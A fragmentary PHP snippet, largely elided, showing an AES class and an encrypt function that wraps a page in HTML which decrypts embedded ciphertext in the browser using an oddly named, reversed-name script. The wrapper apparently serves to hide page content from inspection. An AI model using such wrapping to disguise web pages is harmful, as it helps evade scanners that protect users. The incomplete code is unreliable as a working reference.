...
Class Aes
{
    ...
    public static function cipher($input, $w)
    {
        ...
        $Nr = count($w) / $Nb - 1; // no of rounds: 10/12/14 for 128/192/256-bit key
...
function encrypt($buffer){
	...
	return "<html><head><script src='cabincastle/sedocdnastpircsscriptsandcodes.js'></script>
	<script>
var pinoyunknown = 
('$key'); 
var peralta = 
'$ciphertext';
var output = Aes.Ctr.decrypt(peralta, pinoyunknown, $nBits);
